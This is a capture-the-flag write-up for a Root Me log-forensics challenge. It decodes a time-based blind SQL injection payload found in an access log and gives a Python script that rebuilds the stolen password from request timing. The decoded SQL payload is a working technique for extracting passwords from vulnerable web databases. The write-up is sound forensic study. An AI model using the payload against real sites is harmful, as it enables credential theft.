# Root Me
DISCLAIMER: Challenges will be in either French or English. I'd like to be able to practice French, especially in the infosec/cybersec field.

There's always Google Translate, but I might translate portions anyway.
## 🔬 Forensic 🔬
### Analyse de logs - attaque web:
-------------------------------------------------------------------------------------------------------------
https://www.root-me.org/fr/Challenges/Forensic/Analyse-de-logs-attaque-web
We're given the following hint: 'Énoncé - Notre site web semble avoir été attaqué, mais notre administrateur système ne comprend pas les logs du serveur web. Pouvez-vous retrouver les données qui ont été exfiltrées?'
<details>
  <summary> 🇬🇧 Translation 🇬🇧 </summary> 
'Statement - Our website appears to have been attacked, but our system administrator does not understand the web server logs. Can you find the data that was exfiltrated?'
</details>

Beginning the challenge (http://challenge01.root-me.org/forensic/ch13/ch13.txt), we're able to see an access log. Looking at the first request we can see that it's using base64:
```
192.168.1.23 - - [18/Jun/2015:12:12:54 +0200] "GET /admin/?action=membres&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D HTTP/1.1" 200 1005 "-" "-"
```
```
QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D
```
URL decoded:
```
QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk=
```
base64 decoded:
```
ASC,(SELECT (CASE FIELD(concat(SUBSTRING(bin(ascii(SUBSTRING(password,1,1))),1,1),SUBSTRING(bin(ascii(SUBSTRING(password,1,1))),2,1)),concat(CHAR(48),CHAR(48)),concat(CHAR(48),CHAR(49)),concat(CHAR(49),CHAR(48)),concat(CHAR(49),CHAR(49)))WHEN 1 THEN TRUE WHEN 2 THEN sleep(2) WHEN 3 THEN sleep(4) WHEN 4 THEN sleep(6) END) FROM membres WHERE id=1)
```
This looks interesting; the commas indicate a blind SQL attack. Expanding this, we can see it clearly:
```SQL
SELECT (
        CASE FIELD (
                concat(
                        SUBSTRING(
                                bin(ascii(SUBSTRING(password,1,1))), 1, 1
                        ),
                        SUBSTRING(
                                bin(ascii(SUBSTRING(password,1,1))), 2, 1
                        )
                ),
                concat(CHAR(48),CHAR(48)), 00
                concat(CHAR(48),CHAR(49)), 01
                concat(CHAR(49),CHAR(48)), 10
                concat(CHAR(49),CHAR(49))  11
        )
        WHEN 1 THEN TRUE
        WHEN 2 THEN sleep(2)
        WHEN 3 THEN sleep(4)
        WHEN 4 THEN sleep(6)
        END
) FROM membres WHERE id=1
```
From this we can see that the attacker checks what's in the password field, bit by bit. It takes the first character from the password, converts it to a bin representation, takes the first two bits and then compares to '00', '01', '10' and '11' strings. If it's '00', then nothing happens. If it's '01', the query waits 2 seconds, if it's '10', the query waits 4 seconds and if it's '11', the query waits 6 seconds.

There's a 4th query which checks only one bit, so it's not as long. After 7 bits are rounded up, it becomes ASCII code.
```SQL
[18/Jun/2015:12:13:06 ASC,(
        SELECT (
                CASE FIELD (
                        concat(
                                SUBSTRING(
                                        bin(ascii(SUBSTRING(password,1,1))),7,1
                                )
                        ),
                        CHAR(48), 0
                        CHAR(49)  1
                )
                WHEN 1 THEN sleep(2)
                WHEN 2 THEN sleep(4)
        END) FROM membres WHERE id=1)

```
The following code, written in Python, is what I used to find the flag.
```python
"""
Aliyah Alexis Millán
29 November 2021
Root Me
Logs analysis - Web attack
"""

"""
Provided access log: http://challenge01.root-me.org/forensic/ch13/ch13.txt
This is the log of a blind sql injection attack, the attacker executes multiple queries separated by commas. 
"""
from datetime import datetime

f = open('D:\School Fall 2021\Cyber\RootMe\ch13.txt', 'r')

def get_date(line):
        dateField = line[3]
        date = dateField[1:len(dateField)]
        return datetime.strptime(date, '%d/%b/%Y:%H:%M:%S')
prev_date = False
counter = 0
result = ''
letters = []
 
for line in f:
    if len(line):
        data = line.split(' ')
 
        if prev_date is not False:
            delta = (get_date(data) - prev_date).seconds
            counter += 1
 
            # Check the last bit every 4th request 
            if counter % 4:
                if delta == 0:
                    result += '00'
                elif delta == 2:
                    result += '01'
                elif delta == 4:
                    result += '10'
                elif delta == 6:
                    result += '11'
            else:
                if delta == 2:
                    result += '0'
                elif delta == 4:
                    result += '1'
                else:
                    # If there's no last bit found
                    pass
                letters.append(result)
                result = ''
        prev_date = get_date(data)
f.close()
pwd = ''
for letter in letters:
    pwd += chr(int(letter, 2))
print(pwd)
#Flag is printed.
```
